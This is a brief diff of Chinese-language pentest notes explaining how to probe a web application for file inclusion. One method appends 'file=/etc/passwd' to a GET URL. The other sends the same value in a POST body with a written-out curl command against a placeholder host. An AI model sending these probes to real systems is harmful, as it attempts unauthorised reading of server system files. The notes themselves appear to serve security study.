@@ -1,0 +1,4 @@
+第一种是GET类型(file=/etc/passwd是个例子)
+直接在URL的后部添加file=/etc/passwd进行尝试
+第二种是POST类型
+使用 sudo curl -X POST --data="file=/etc/passwd" http://ip/目录
